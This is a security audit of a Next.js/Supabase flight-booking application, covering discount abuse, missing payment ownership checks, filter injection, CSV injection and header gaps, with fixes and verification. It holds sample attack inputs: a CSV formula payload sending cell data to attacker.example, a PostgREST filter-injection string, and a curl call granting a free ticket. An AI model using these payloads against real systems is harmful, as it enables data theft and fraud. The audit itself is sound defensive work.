# FlightBook — Security Audit

**Date:** 2026-07-27
**Scope:** Full application — Next.js 15 App Router frontend, server actions, route handlers, Supabase Postgres schema, RLS policies, SECURITY DEFINER RPCs, storage policies, dependencies, CI.
**Commit audited:** `d56fd56`
**Methodology:** Manual white-box review of every authentication path, authorization guard, RLS policy, database function, user-input sink, and dependency. No live Supabase instance was tested; findings are derived from source and are marked where runtime confirmation is advised. Findings 1, 2, 3 and 9 were subsequently confirmed and their fixes verified against a local PostgreSQL 16 instance; findings 4-7 were fixed and verified by unit test and by loading a real production build in headless Chromium.

---

## The central architectural issue

Everything below flows from one fact that shapes the whole threat model:

**The Supabase PostgREST API is a public, directly-reachable endpoint, and every staff member holds a valid JWT for it.**

`NEXT_PUBLIC_SUPABASE_ANON_KEY` is compiled into the browser bundle by design, and each logged-in user's session token sits in their cookies. Any staff member can therefore skip the Next.js app entirely and `curl` the database API directly:

```
curl -X POST 'https://<project>.supabase.co/rest/v1/rpc/create_booking' \
  -H "apikey: <anon key from the JS bundle>" \
  -H "Authorization: Bearer <their own session JWT>" \
  -d '{ "p_flight_id": "...", "p_discount_type": "percent", "p_discount_value": 100, ... }'
```

The consequence: **the Zod schemas in `lib/validations/` are input hygiene, not security controls.** They are enforced only on the path through the server actions. The real, unbypassable trust boundary is exactly two things — the RLS policies, and the checks written inside the `SECURITY DEFINER` functions. Any rule that exists only in Zod does not exist.

The good news is that this codebase already understands the principle: money-bearing writes are correctly funnelled through `SECURITY DEFINER` RPCs, the tables have no direct `INSERT` policies for bookings or payments, and a trigger guards the financial columns. The findings below are the places where a rule was written in Zod (or the UI) but never mirrored into the database layer.

---

## Findings summary

**Remediation status:** findings 1, 2, 3 and 9 are fixed in `supabase/migrations/0011_security_hardening.sql`, verified by running each exploit against a real Postgres 16 instance before and after the migration — see [Verification](#verification-of-the-0011-fixes). Findings 4, 5, 6 and 7 are fixed in application code, verified by unit tests and by a real browser load of the running build — see [Verification](#verification-of-the-application-layer-fixes-4-7).

| # | Severity | Finding | Status |
|---|----------|---------|--------|
| 1 | **High** | Any agent can issue themselves a 100%-discount (free) ticket — no discount ceiling or approval anywhere in the stack | Fixed in 0011 |
| 2 | **High** | `record_payment` has no ownership check — any agent can fabricate a payment against any booking in the system | Fixed in 0011 |
| 3 | **High** | Passenger-count is unbounded server-side — one API call can drain an entire flight's seat inventory | Fixed in 0011 |
| 4 | **Medium** | PostgREST filter injection via search boxes (3 locations) | Fixed |
| 5 | **Medium** | CSV formula injection in the admin report export, via a self-editable field | Fixed |
| 6 | **Medium** | No security headers at all — clickjacking is live on every authenticated route | Fixed |
| 7 | **Medium** | 8 known-vulnerable dependencies (5 high), and no dependency scanning in CI | Fixed |
| 8 | **Medium** | Weak credential lifecycle: admin-chosen passwords, never rotated, no MFA, no lockout — undermines the whole `created_by` audit trail | Open |
| 9 | **Medium** | Financial-report tampering via unprotected booking columns | Fixed in 0011 |
| 10 | **Low** | Payments are immutable with no reversal path — errors and fraud are both permanent | Open |
| 11 | **Low** | Helper database functions are executable by `anon` / `authenticated` | Open |
| 12 | **Low** | Bulk PII exposure: every agent can pull every passenger's government ID, unlogged | Open |
| 13 | **Low** | Avatar upload is validated client-side only, into a public bucket | Open |
| 14 | **Low** | `search_path` not pinned on functions called from `SECURITY DEFINER` context | Partly (0011) |
| 15 | **Low** | The `app.rpc` bypass flag is a fragile design for a security control | Open |
| 16 | **Info** | CI does not run on the default branch | Open |

---

## 1. HIGH — Any agent can issue a free ticket

**Where:** `supabase/migrations/0009_tiered_pricing_and_statements.sql:383-393`, `lib/validations/booking.ts:29`, `app/(dashboard)/bookings/new/wizard.tsx:511`

The discount is applied with no upper bound at any layer:

```sql
if p_discount_type = 'percent' then
  v_discount := round((v_out_subtotal + v_ret_subtotal) * p_discount_value / 100.0, 2);
elsif p_discount_type = 'fixed' then
  v_discount := p_discount_value;
end if;
if v_discount > v_out_subtotal + v_ret_subtotal then   -- clamps to the fare, but never lower
  v_discount := v_out_subtotal + v_ret_subtotal;
end if;
```

The Zod schema is `z.coerce.number().min(0)` — a minimum but no maximum. The UI input is `<Input type="number" min="0" step="0.01">` — again no `max`. And the RPC itself performs no check on `p_discount_value` at all.

**This is not even a bypass.** An agent can type `100` into the percent field in the normal booking wizard and produce a `$0.00` booking that reserves a real, revenue-generating seat. `booking_balances` will compute `amount_due = 0`, so the booking shows as owing nothing and never appears in any outstanding-balance report. The ticket PDF at `/bookings/[id]/ticket` renders regardless of booking status, so the agent walks away with a valid boarding document.

There is no approval workflow, no admin-only ceiling, and no alerting on large discounts. `discount_reason` is free text and optional in practice.

**Impact:** Direct, unlimited revenue loss by any agent, self-service, with a plausible paper trail (it looks like a legitimate discount). This is the single highest-value finding in the audit.

**Fix:** Enforce a ceiling in the RPC — the only place that counts:

```sql
if p_discount_type = 'percent' and (p_discount_value < 0 or p_discount_value > 100) then
  raise exception 'INVALID_DISCOUNT';
end if;
-- and gate anything above a policy threshold on is_admin()
if not public.is_admin() and v_discount > (v_out_subtotal + v_ret_subtotal) * 0.10 then
  raise exception 'DISCOUNT_NEEDS_ADMIN';
end if;
```

Mirror the ceiling in Zod and add `max` to the UI input for user experience, but treat the RPC check as the control.

---

## 2. HIGH — `record_payment` has no ownership check

**Where:** `supabase/migrations/0009_tiered_pricing_and_statements.sql:606`

`cancel_booking` correctly restricts agents to their own pending bookings:

```sql
if not public.is_admin() then
  if v_b.created_by <> v_actor or v_b.status <> 'pending' then
    raise exception 'NOT_ALLOWED';
  end if;
end if;
```

`record_payment` performs **no equivalent check**. Its only guard is:

```sql
if not public.is_active_staff() then raise exception 'NOT_STAFF'; end if;
```

Any active agent can therefore record a payment against **any booking in the system**, including bookings created by other agents and by admins. `p_amount` is validated only by the table constraint `amount > 0` — there is no upper bound and no check that the amount bears any relation to what is owed.

**Attack paths:**
- Mark any pending booking as `confirmed` by inserting a fabricated payment, with no money ever received. The booking auto-confirms at `v_paid >= v_target` and a ticket becomes issuable.
- Record an inflated payment to distort `total_revenue` and the `by_agent` revenue league table in the admin report (`received_by` is set to the acting agent, so an agent can inflate their own apparent performance).
- Overpay a booking to manufacture a customer credit that `customer_balances.outstanding` will carry as a negative balance.

**Impact:** Fraudulent confirmation of unpaid bookings and corruption of all revenue reporting, by any agent, against any record.

**Fix:** Add the same ownership gate `cancel_booking` uses, and validate the amount against the outstanding balance:

```sql
if not public.is_admin() and v_b.created_by <> v_actor then
  raise exception 'NOT_ALLOWED';
end if;
if p_amount > (select balance from public.booking_balances where id = p_booking_id) then
  raise exception 'OVERPAYMENT';
end if;
```

---

## 3. HIGH — Unbounded passenger count drains seat inventory

**Where:** `supabase/migrations/0009_tiered_pricing_and_statements.sql:248, 272-274`, `lib/validations/booking.ts:25`

Zod caps the passenger array at 9 (`.max(9)`). The RPC only checks the lower bound:

```sql
v_count int := coalesce(jsonb_array_length(p_passengers), 0);
...
if v_count < 1 then
  raise exception 'CUSTOMER_REQUIRED: at least one passenger';
end if;
```

`v_count` then drives the seat decrement directly:

```sql
update public.flights set seats_available_economy = seats_available_economy - v_count
```

A direct API call with a 10,000-element `p_passengers` array is rejected only by the seat-availability check (`SOLD_OUT`) — so an attacker submits exactly `seats_available_economy` passengers and takes the entire cabin in one transaction. The booking sits in `pending` and holds every seat. There is no booking expiry or hold-timeout anywhere in the schema, so those seats are never released; only a manual cancellation frees them.

Combined with finding 1, the whole flight can be taken for `$0.00`.

**Impact:** Denial of service against revenue — a single agent (or anyone who obtains one agent session) can make every flight unsellable, indefinitely.

**Fix:** Mirror the cap in the RPC (`if v_count > 9 then raise exception 'TOO_MANY_PASSENGERS'; end if;`) and introduce a pending-booking expiry job that restores seats after a hold window.

---

## 4. MEDIUM — PostgREST filter injection in search

**Where:**
- `app/(dashboard)/customers/page.tsx:25`
- `app/(dashboard)/bookings/page.tsx:43`
- `app/(dashboard)/statements/page.tsx:27`

```ts
if (q) query = query.or(`full_name.ilike.%${q}%,phone.ilike.%${q}%`);
```

The raw query-string parameter `q` is interpolated straight into a PostgREST filter expression. The `.or()` argument is a structured mini-language in which `,` separates terms, `.` separates operators, and `()` groups — none of which are escaped here.

A value such as `x,id.not.is.null` closes the intended term and appends an attacker-chosen one, returning every row regardless of the search. More usefully to an attacker, the injected term can reference **any column on the table**, including ones never exposed in the UI — `customers.notes`, for example — enabling blind boolean enumeration of field contents one character at a time. Malformed input also reaches Postgres directly and can be used to trigger parser errors.

The confidentiality impact is currently bounded because `staff read customers` already grants every active staff member SELECT on the whole table, so an agent learns little they could not query legitimately. That bound is incidental, not designed: the same copy-pasted pattern applied to a table with per-row RLS would be a full cross-tenant data breach, and this pattern has already been copied to three locations.

**Fix:** Escape the PostgREST metacharacters before interpolation, and reject the rest:

```ts
const safe = q.replace(/[,.()\\%_"']/g, "");
if (safe) query = query.or(`full_name.ilike.%${safe}%,phone.ilike.%${safe}%`);
```

Better still, move the search into a `SECURITY DEFINER` RPC that takes `q` as a bound parameter, which removes the string-building problem entirely. Note `bookings/page.tsx:46` also interpolates UUIDs into an `.in.(...)` list — those come from the database rather than the user so they are safe today, but the pattern is fragile.

---

## 5. MEDIUM — CSV formula injection in the report export

**Where:** `app/(dashboard)/reports/export/route.ts:8-11`

```ts
function csvCell(v: unknown): string {
  const s = String(v ?? "");
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
```

This correctly handles CSV *quoting*, but not CSV *formula injection* (CWE-1236). Excel, LibreOffice Calc and Google Sheets evaluate any cell whose content begins with `=`, `+`, `-`, `@`, or a leading tab/carriage return as a formula — quoting does not prevent this.

The injected value is `a.agent`, which is `profiles.full_name` — a field every staff member can set on themselves through `updateProfile` (`app/(dashboard)/profile/actions.ts:9`). The only constraint is `z.string().trim().min(2)`: no character restrictions at all.

**Attack:** An agent renames themselves to `=HYPERLINK("https://attacker.example/?d="&A1,"Revenue")` or a `DDE()`/`IMPORTXML()` payload, then waits. When an admin exports the report and opens it — the expected workflow for this feature — the formula executes in the admin's spreadsheet, exfiltrating adjacent revenue figures or prompting for command execution. The attacker's own name in the report is the delivery vehicle, which makes it look entirely routine.

**Fix:** Prefix-escape dangerous leading characters in `csvCell`:

```ts
function csvCell(v: unknown): string {
  let s = String(v ?? "");
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
```

Apply it to every cell, not just `agent` and `method` — `from`/`to` on line 33 are also unescaped attacker-controlled query parameters.

---

## 6. MEDIUM — No security headers

**Where:** `next.config.ts` (empty config)

The application sets no security headers whatsoever. Missing:

- **`Content-Security-Policy`** — no defense-in-depth against XSS, and no `frame-ancestors`.
- **`X-Frame-Options`** — **the application is fully framable.** This matters more than usual here: cancelling a booking (`cancel-dialog.tsx`) and recording a payment (`payment-dialog.tsx`) are one-or-two-click actions inside an authenticated session. An attacker who gets a logged-in agent onto a malicious page can UI-redress those clicks into destructive actions.
- **`Strict-Transport-Security`** — no HSTS.
- **`X-Content-Type-Options: nosniff`** — relevant given the PDF and CSV responses.
- **`Referrer-Policy`** — booking IDs currently leak in `Referer` to any third-party resource.
- **`Permissions-Policy`**.

**Fix:** Add a `headers()` block to `next.config.ts`. `frame-ancestors 'none'` and `nosniff` are the priorities.

---

## 7. MEDIUM — Vulnerable dependencies, no scanning in CI

`npm audit --production` reports **8 vulnerabilities (5 high, 3 moderate)**:

- **`postcss` ≤ 8.5.17** — three advisories, including arbitrary file read and path traversal via attacker-controlled `sourceMappingURL` in CSS comments (`GHSA-6g55-p6wh-862q`, `GHSA-r28c-9q8g-f849`), plus XSS via unescaped `</style>` (`GHSA-qx2v-qp2m-jg93`).
- **`sharp` < 0.35.0** — inherited libvips CVEs `CVE-2026-33327`, `CVE-2026-33328`, `CVE-2026-35590`, `CVE-2026-35591`.

Both arrive transitively through `next@15.5.20`.

The CI workflow (`.github/workflows/ci.yml`) runs lint, typecheck and tests but has **no `npm audit` step and no Dependabot configuration**, so nothing surfaces this automatically.

**Correction (found while remediating):** this section originally claimed `next@15.5.22` resolves all eight. It does not. The bump clears the eight Next.js advisories, but `next@15.5.22` still bundles `postcss@8.4.31` and declares `sharp: ^0.34.3`, so both remain vulnerable and need explicit `overrides`. Two further points only became visible once the tree was actually rebuilt:

- **`shadcn` was in `dependencies`, not `devDependencies`.** It is a scaffolding CLI that no application file imports, and it dragged `@modelcontextprotocol/sdk` and `@hono/node-server` into the production dependency tree along with their advisories.
- **`sharp` is never exercised.** Nothing in the app uses `next/image`, so the libvips CVEs were not reachable — which lowers the real severity of that half of the finding, and makes the override safe to apply.

**Fix applied:** bump to `next@15.5.22`, move `shadcn` to `devDependencies`, pin `postcss ^8.5.23`, `sharp ^0.35.3`, `brace-expansion ^5.0.8` and `fast-uri ^3.1.4` via `overrides`, add an audit job to CI, and add `.github/dependabot.yml`.

`npm audit --omit=dev` now reports **0 vulnerabilities**. Three moderate advisories remain in the dev-only `shadcn` CLI chain; CI gates on the production tree and reports the dev tree without failing the build, so a vulnerability in build tooling cannot block a release while a shipped one always will.

Note that finding 16 still limits this: CI runs on pull requests and one stale branch, so the audit gate does not run on the default branch.

*Positive note:* Next.js `15.5.20` is past the fix for **CVE-2025-29927** (the `x-middleware-subrequest` middleware-bypass, fixed in 15.2.3), so that well-known Next.js authentication bypass does **not** apply here. This was specifically checked.

---

## 8. MEDIUM — Credential lifecycle weaknesses

**Where:** `app/(dashboard)/settings/staff/actions.ts:9-58`, `app/login/actions.ts`, `lib/validations/auth.ts`

Several weaknesses compound:

- **The admin chooses every user's password** (`createStaff` takes a `password` field and sets `email_confirm: true`), and `resetStaffPassword` sets one directly. **Nothing ever forces a rotation.** The admin therefore permanently knows every agent's credentials.
- **No MFA** anywhere.
- **Password policy is 8 characters, no complexity** (`z.string().min(8)`), for an application that handles money and government ID data.
- **No rate limiting or account lockout** on the `login` server action — it relies entirely on Supabase's default auth throttling, which is generous and not tuned here.
- **No session timeout or re-authentication** for sensitive operations.

The first point is the serious one. Because the admin knows every password, **any action attributed to an agent via `created_by` or `received_by` is repudiable.** That silently undermines the integrity of the entire audit trail — `booking_events`, the `by_agent` report, and every ownership check in the RPCs all rest on the assumption that a session identifies a person.

**Fix:** Generate a random one-time password on staff creation, mark the profile as requiring a change, and force rotation at first login. Raise the minimum length to 12, enable Supabase's leaked-password protection, and enable MFA for the `admin` role at minimum.

*Positive note:* login error messages are correctly generic ("Incorrect email or password"), so there is **no user enumeration** on the login form. Deactivated accounts are also correctly rejected at both login (`app/login/actions.ts:31`) and on every request (`lib/auth/get-profile.ts:18`).

---

## 9. MEDIUM — Report tampering via unprotected booking columns

**Where:** `supabase/migrations/0009_tiered_pricing_and_statements.sql:49-69`, `0003_bookings.sql:121-125`

The `protect_booking_columns` trigger guards `status`, `reference`, `flight_id`, `cabin_class`, `passenger_count`, `subtotal`, `total_amount`, `carried_balance`, `linked_booking_id`, `cancelled_by`, `cancelled_at`.

It does **not** guard `discount_type`, `discount_value`, `discount_reason`, `extra_baggage_kg`, `extra_baggage_fee`, `customer_id`, or `currency`. The `edit own pending or admin` policy lets an agent `PATCH` their own pending booking directly via PostgREST.

The admin report computes discounts as a **derived** figure, filtered by `discount_type`:

```sql
select coalesce(sum(greatest(0,
  subtotal + extra_baggage_fee + carried_balance - total_amount)), 0)
from public.bookings b
where ... and discount_type <> 'none'
```

So an agent who sets `discount_type = 'none'` on their own booking **erases that discount from the admin's report entirely**, while `total_amount` stays discounted — the money is still gone, the oversight signal is not. Adjusting `extra_baggage_fee` distorts the same figure in either direction. Reassigning `customer_id` moves an outstanding debt onto a different customer's statement.

This turns finding 1 from "visible discount abuse" into "invisible discount abuse".

**Fix:** Add these columns to the trigger's protected list. They are all money-bearing or attribution-bearing and none of them has a legitimate direct-`PATCH` use case; the RPCs already own every legitimate write.

---

## 10. LOW — Payments are immutable with no reversal path

**Where:** `supabase/migrations/0003_bookings.sql:135-136`

`payments` has a SELECT policy and nothing else — no INSERT (correct, RPC-only), but also **no UPDATE and no DELETE, and no refund or void RPC anywhere in the schema**. The comment states this is deliberate ("immutable after").

Immutability is the right instinct for a financial ledger, but the schema provides no compensating mechanism. There is no `refund` or `void_payment` RPC and no negative-amount entry (`check (amount > 0)` forbids it). So a payment recorded in error — or fraudulently, per finding 2 — **can never be corrected through the application at all.** The only remedy is direct database access with the service-role key, which is itself an audit-trail gap and puts staff in the habit of reaching for production SQL.

**Fix:** Add a `void_payment(p_payment_id, p_reason)` RPC restricted to `is_admin()` that writes a compensating entry and a `booking_events` record, rather than deleting. This preserves ledger immutability while making corrections auditable.

---

## 11. LOW — Helper functions executable by `anon` / `authenticated`

**Where:** `supabase/migrations/0004`, `0005`, `0009`

The audit-sensitive RPCs correctly `revoke execute ... from anon`:

```sql
revoke execute on function public.create_booking from anon;
revoke execute on function public.cancel_booking from anon;
revoke execute on function public.record_payment from anon;
```

But Postgres grants `EXECUTE` on new functions to `PUBLIC` by default, and these were never revoked:

- `public.restore_seats(public.bookings)`
- `public.leg_subtotal(public.flights, text, int, int, int)`
- `public.generate_booking_reference()`
- `public.is_admin()`, `public.is_active_staff()`
- `public.set_updated_at()`, `public.protect_booking_columns()`

`restore_seats` is the notable one. It is *not* `SECURITY DEFINER`, so RLS on `flights` blocks a plain agent — but it is exposed to any **admin** as a way to inflate `seats_available_*` on any flight with **no corresponding booking and no `booking_events` record**, i.e. an unlogged inventory write that bypasses the entire audited cancellation path.

`generate_booking_reference()` is an unbounded retry loop reachable by `anon` — a cheap way to burn database CPU without authenticating.

**Fix:** `revoke execute ... from anon, authenticated` on all of the above. Functions called only from inside other functions need no external grant at all.

---

## 12. LOW — Bulk PII exposure, unlogged

**Where:** `app/(dashboard)/bookings/[id]/ticket/route.tsx:15`, `supabase/migrations/0003_bookings.sql:118`

The ticket route authenticates but performs **no ownership check**:

```ts
await getProfile(); // redirects if not authenticated
const { id } = await params;
const data = await loadTicketData(id);
```

This is consistent with the `staff read bookings` policy, so it is by design for a back-office tool rather than an IDOR in the strict sense. The concern is the aggregate: the generated PDF bundles passenger full names, **government ID numbers** (`passengers.id_number`), customer phone, and email into one document, and any agent can enumerate `/bookings/<uuid>/ticket` across the entire database.

Compounding factors:
- `id_number` is stored in plaintext with no application-level encryption and no retention policy.
- There is **no access logging** on ticket generation — `booking_events` records creation, payment and cancellation, but not reads. A mass PII export leaves no trace anywhere.
- Per finding 8, the admin knows every agent's password, so such an export cannot be reliably attributed.

**Fix:** Log ticket generation to `booking_events`. Consider restricting full ID numbers to the booking's creator and admins, masking them for other staff. Define a retention policy for `id_number`.

---

## 13. LOW — Avatar upload validated client-side only

**Where:** `app/(dashboard)/profile/profile-form.tsx:30-54`, `supabase/migrations/0007_avatars_storage.sql`

All upload validation is in the browser:

```ts
if (!file.type.startsWith("image/")) { ... }   // client-side only
if (file.size > MAX_BYTES) { ... }             // client-side only
const ext = file.name.split(".").pop() ?? "png";
const path = `${profile.id}/avatar.${ext}`;
```

The storage RLS policy enforces only the folder prefix — **no MIME restriction and no size limit**. Since the upload goes directly from browser to Supabase Storage, all three checks are trivially skipped:

- **Arbitrary content type:** the extension comes from the user's own filename, so `evil.svg` or `evil.html` lands in the bucket. `getPublicUrl` indicates a **public** bucket, making this world-readable without authentication — usable for malware hosting or SVG-borne XSS on the storage origin.
- **No size limit:** a multi-gigabyte upload is accepted, a straightforward storage-cost and availability attack.
- The `select` policy gating reads on `is_active_staff()` is **decorative** if the bucket is public, since public URLs bypass RLS entirely. *(Worth confirming against the live bucket configuration — the bucket is created outside these migrations.)*

Separately, the `update` and `delete` policies omit the `is_active_staff()` check that `select` and `insert` include, so a just-deactivated user holding an unexpired JWT retains write access to their avatar path. Minor, but an inconsistency worth closing.

**Fix:** Set `allowed_mime_types` and `file_size_limit` on the bucket itself. Derive the extension from a validated MIME allowlist rather than the filename. Make the bucket private and serve via signed URLs. Add `is_active_staff()` to the update/delete policies.

---

## 14. LOW — `search_path` not pinned on functions used in `SECURITY DEFINER` context

**Where:** `0004:1`, `0005:2`, `0009:76`, `0001:14`, `0003:83`

`is_admin()` and `is_active_staff()` correctly pin `set search_path = public` — this is exactly right and is the highest-risk case, since they are `SECURITY DEFINER` and every RLS policy in the project depends on them.

However, `restore_seats`, `leg_subtotal`, `generate_booking_reference`, `set_updated_at` and `protect_booking_columns` have **no `set search_path`** clause. None is `SECURITY DEFINER` today, so there is no live privilege-escalation path — but `restore_seats` and `leg_subtotal` are both *called from inside* `SECURITY DEFINER` functions, and `protect_booking_columns` is a trigger that **enforces a security control**. Converting any of them to `SECURITY DEFINER` — an entirely natural future refactor — would silently make them injectable via a hostile `search_path`.

**Fix:** Add `set search_path = public` to all five. It is free and removes a latent footgun.

---

## 15. LOW — The `app.rpc` bypass flag is fragile

**Where:** `supabase/migrations/0009_tiered_pricing_and_statements.sql:49-54`

The column-protection trigger is disabled by a session GUC:

```sql
if coalesce(current_setting('app.rpc', true), '') = 'on' then
  return new;   -- all protection skipped
end if;
```

and each RPC opts out with `perform set_config('app.rpc', 'on', true)`.

This is safe **today**: PostgREST routes only to functions in the exposed schema, `set_config` lives in `pg_catalog`, and the third argument `true` scopes the setting to the transaction. But the control is fail-open and ambient — a single future `SECURITY DEFINER` function in `public` that sets this flag (or fails to reset it before doing other work) silently disables protection on every money column, application-wide, with no error. Once set, the flag stays on for the remainder of the transaction, so any subsequent statement in the same transaction is unprotected.

**Fix:** Prefer a fail-closed check the caller cannot influence — for example, verifying that the current execution context is one of the known RPCs, or moving protected columns behind column-level `GRANT`s so the privilege system enforces this rather than a trigger reading a mutable setting.

---

## 16. INFO — CI does not run on the default branch

**Where:** `.github/workflows/ci.yml:4-6`

```yaml
on:
  push:
    branches: ["claude/web-app-uploaded-plans-7eqa9m"]
  pull_request:
```

Push-triggered CI is pinned to a single stale feature branch. Direct pushes to the default branch run no lint, typecheck, or tests. PR-triggered runs still work, so the gap only opens for direct pushes — but that is exactly the path a hotfix takes.

**Fix:** Change to `branches: [main]` (or the repository's default branch name).

---

## What was checked and found sound

Recording these explicitly, both because they represent real work done well and so a future reviewer does not re-litigate them:

- **Middleware uses `getUser()`, not `getSession()`** (`lib/supabase/middleware.ts:35`). This is the correct choice — `getSession()` trusts an unverified cookie, `getUser()` validates against the auth server. The "do not run code between `createServerClient` and `getUser()`" comment shows the cookie-refresh pitfall was understood.
- **Authorization is re-checked server-side on every page and action**, never relying on middleware alone. Middleware is treated as a redirect convenience, which is correct — it is not a security boundary in Next.js.
- **Service-role key handling is correct.** `lib/supabase/admin.ts` imports `server-only`, carries an explicit warning comment, is used in exactly one file (`settings/staff/actions.ts`), and every call site is preceded by `await requireAdmin()`. Verified by grep — there are no other usages.
- **Secrets are not committed.** `.gitignore` covers `.env*` with an `!.env.example` exception, and `.env.example` contains only placeholders.
- **Next.js 15.5.20 is not vulnerable to CVE-2025-29927** (middleware auth bypass, fixed in 15.2.3).
- **RLS `WITH CHECK` semantics are correct.** The `UPDATE` policies on `bookings`, `passengers`, `customers` and `storage.objects` specify only `USING`. This initially looks like a missing-`WITH CHECK` vulnerability, but PostgreSQL applies the `USING` expression to the *new* row as well when `WITH CHECK` is absent. Row-migration attacks (an agent moving a booking to another agent by rewriting `created_by`, or moving a storage object into another user's folder) are therefore **correctly blocked**. Finding 9 concerns *column* contents, not row ownership.
- **Privilege escalation via the profiles table is blocked.** The `own row or admin can update` policy's `WITH CHECK` compares the new `role` against a subquery of the current role. Because the subquery cannot see the in-flight update, an agent cannot promote themselves to admin.
- **`is_admin()` / `is_active_staff()` pin `search_path`** and are correctly `SECURITY DEFINER` — the single most important hardening detail in the schema, done right.
- **No XSS sinks.** No `dangerouslySetInnerHTML`, `eval`, `new Function`, or `innerHTML` anywhere in the application. React's default escaping is relied on throughout.
- **No SQL injection.** All database access goes through the PostgREST client or parameterised RPCs; no string-concatenated SQL exists. (Finding 4 is *filter* injection at the PostgREST layer, a different and much more limited class.)
- **Financial writes are correctly funnelled through RPCs.** `bookings` and `payments` have no `INSERT` policy at all, forcing all creation through `SECURITY DEFINER` functions — a genuinely good design.
- **Concurrency is handled.** `create_booking` and `cancel_booking` take `FOR UPDATE` row locks in consistent `order by id` to prevent both seat-overselling races and deadlocks.
- **Deactivated staff are locked out** at login and on every subsequent request, with an explicit `signOut()`.
- **Login errors do not enable user enumeration.**

---

## Verification of the 0011 fixes

Findings 1, 2, 3 and 9 are addressed by `supabase/migrations/0011_security_hardening.sql`. Because these are database-layer controls that no unit test can reach, each was verified empirically: the full migration chain was applied to a real PostgreSQL 16 instance (with Supabase's `auth` and `storage` primitives stubbed), and each exploit was run twice — once against a database at `0010`, once against the same database after `0011`.

**Confirming the vulnerabilities were real** (database at `0010`, acting as a non-admin agent):

| Exploit | Result before 0011 |
|---|---|
| Book with `p_discount_value = 100`, `percent` | Succeeded — `subtotal=100.00`, **`total_amount=0.00`**, holding a real seat, `balance=0` so it never appears in any outstanding-balance report |
| Book with 46 passengers on a 50-seat flight | Succeeded — `seats_available_economy` fell from 50 to 3 in one call, held indefinitely |
| Agent B posts a `999999` payment on Agent A's booking | Succeeded — returned `{"paid": 999999.00, "status": "confirmed", "target": 4600.00}`, confirming a 4,600 booking with no money received |
| Agent A sets `discount_type='none'` and reassigns `created_by` | Succeeded — `UPDATE 1`; the discount vanished from the report and the booking was re-attributed to another agent |

**After applying 0011**, every one of those calls is rejected: `DISCOUNT_NEEDS_ADMIN:10`, `TOO_MANY_PASSENGERS:9`, `NOT_ALLOWED`, and `PROTECTED_COLUMNS` respectively. A percent value above 100 additionally raises `INVALID_DISCOUNT`, a non-positive payment raises `INVALID_AMOUNT`, an amount above the outstanding balance raises `OVERPAYMENT:<balance>`, and paying a settled booking raises `NOTHING_OWED`.

**Legitimate behaviour was checked for regressions and is unchanged:**

- A normal two-passenger booking (adult + child, tiered fares) succeeds.
- An agent granting a discount at the 10% ceiling succeeds.
- An **admin** granting a 100% discount succeeds — the ceiling gates agents, not authorised comps.
- Partial payment then settlement works: `120` leaves `pending`, a further `80` flips the booking to `confirmed`.
- An admin may still record a payment against another agent's booking.
- Seat accounting is correct throughout, including rollback: the rejected 46-passenger booking left `seats_available` untouched.
- A no-op `UPDATE` that writes a protected column to its existing value still succeeds, so an idempotent write from the application does not spuriously fail.

The migration was also applied to a database that had already been exploited (to confirm it upgrades live, inconsistent data without error) and re-run three times to confirm idempotency.

**What this does not cover:** the checks were exercised through the RPCs with `auth.uid()` stubbed, running as a superuser, so RLS policies themselves were not exercised — only the in-function authorization logic and the trigger. RLS behaviour is unchanged by this migration. The `0011` behaviour should still be smoke-tested against a real Supabase project before it is relied on in production.

---

## Verification of the application-layer fixes (4-7)

**Finding 4 — filter injection.** All three call sites now route the search term through `sanitizeSearchTerm` in `lib/search.ts`, which strips every character carrying meaning to PostgREST's filter grammar (`, . ( ) " \ : *`) or to SQL `LIKE` (`% _`), plus control characters. Apostrophes are deliberately kept: PostgREST binds values as parameters, so `'` is not an injection vector and names like O'Brien must stay searchable. `bookings/page.tsx` additionally filters its `in.(...)` id list through `isUuid`. A property test asserts that no metacharacter survives for any of the payloads in the finding, and `customerSearchFilter("x,id.not.is.null")` is confirmed to still produce exactly two filter terms.

**Finding 5 — CSV formula injection.** `csvCell` now prefixes `=`, `+`, `-`, `@`, tab and CR with an apostrophe, and is applied to every cell rather than just `agent` and `method`. The `from`/`to` parameters are no longer interpolated raw: they are validated as real ISO calendar dates and the request is rejected with 400 otherwise, which closes the same input as a vector into both the CSV body and the `Content-Disposition` filename. Tests cover the HYPERLINK payload end to end, including the case where the payload's own commas force CSV quoting so the neutralising apostrophe lands inside the quotes.

**Finding 6 — security headers.** Verified against a real production build, not just the config. Serving the built app and requesting `/login` returns `Content-Security-Policy` (with `frame-ancestors 'none'`), `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy` and `Strict-Transport-Security`, and no longer returns `X-Powered-By`.

Because a CSP that breaks the app is worse than no CSP, the page was then loaded in headless Chromium: **0 CSP violations, 0 console errors**, with the three.js login scene, Tailwind styling and the sign-in form all rendering correctly. The Supabase origin is derived from `NEXT_PUBLIC_SUPABASE_URL` at build time into `connect-src` (https and wss, for realtime) and `img-src` (avatars), which is what keeps the app working under `default-src 'self'`.

Two deliberate limitations: `script-src` and `style-src` retain `'unsafe-inline'`, because Next.js inlines its hydration and streaming payloads and removing it requires threading a per-request nonce through middleware. The CSP is therefore defence in depth, not an XSS cure. `Strict-Transport-Security` omits `preload`, which is a long-lived commitment for the apex domain and should be an explicit decision by whoever owns the DNS.

**Finding 7 — dependencies.** See the correction recorded in the finding itself: the original recommendation was incomplete. `npm audit --omit=dev` now reports 0 vulnerabilities, the production build succeeds with the overridden `postcss` and `sharp`, and all 113 unit tests pass.

**What this does not cover:** the search and export fixes were verified by unit test against the sanitizer and the cell encoder, not by firing crafted requests at a live PostgREST instance, and the header checks were run against a build using placeholder Supabase credentials. Both should be smoke-tested against a real deployment. The CSP in particular is the change most likely to surface an issue only in production, where real avatar URLs and realtime websockets are exercised.

---

## Recommended remediation order

1. **Finding 1** — discount ceiling in `create_booking`. Highest impact, smallest change.
2. **Finding 2** — ownership check in `record_payment`.
3. **Finding 3** — passenger-count cap in `create_booking`.
4. **Finding 9** — extend the protected-columns trigger (this is what makes 1 and 2 detectable after the fact).
5. **Findings 4, 5** — input sanitisation; both are self-contained.
6. **Findings 6, 7** — security headers and the `next@15.5.22` bump; both are one-line changes.
7. **Finding 8** — forced password rotation. Larger effort, but it is what makes the audit trail mean anything.
8. Remainder as hardening.

